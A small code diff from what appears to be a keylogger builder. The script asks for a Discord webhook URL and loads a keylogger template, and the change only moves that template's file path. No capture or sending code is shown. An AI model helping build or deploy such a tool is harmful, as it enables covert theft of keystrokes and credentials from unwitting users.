@@ -99,7 +99,7 @@ def main():
             continue
         if choice == 1:
             url = input("\nEnter discord webhook url: ")
-            discord_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), "remote", "discord", "keylogger.py")
+            discord_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), "remote", "keylogger.py")
             python_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), "keylogger.py")
             with open(discord_file, "r", encoding="utf-8") as f:
                 content = f.read()
